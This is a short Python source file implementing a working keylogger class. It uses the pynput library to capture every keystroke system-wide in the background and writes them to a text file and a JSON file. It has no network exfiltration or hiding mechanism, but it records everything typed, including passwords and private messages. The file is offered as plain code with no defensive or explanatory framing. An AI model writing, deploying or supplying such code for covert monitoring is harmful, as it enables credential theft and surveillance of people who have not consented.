import pynput.keyboard
import json
import threading

class KeyLogger:
    def __init__(self, txt_file="logs.txt", json_file="logs.json"):
        self.txt_file = txt_file
        self.json_file = json_file
        self.log = ""
        self.key_list = []
        self.running = False
        self.listener = None

    def append_to_log(self, key_string):
        self.log += key_string
        with open(self.txt_file, "a+", encoding="utf-8") as f:
            f.write(key_string)

    def update_json(self, key_data):
        self.key_list.append(key_data)
        with open(self.json_file, "w", encoding="utf-8") as f:
            json.dump(self.key_list, f, indent=4)

    def process_key_press(self, key):
        try:
            # Handle standard character keys
            current_key = str(key.char)
        except AttributeError:
            # Handle special keys (Space, Enter, etc.)
            if key == pynput.keyboard.Key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "

        self.append_to_log(current_key)
        self.update_json({"Pressed": str(key)})

    def start(self):
        if not self.running:
            self.running = True
            self.listener = pynput.keyboard.Listener(on_press=self.process_key_press)
            self.listener.start()

    def stop(self):
        if self.running and self.listener:
            self.running = False
            self.listener.stop()
            self.listener = None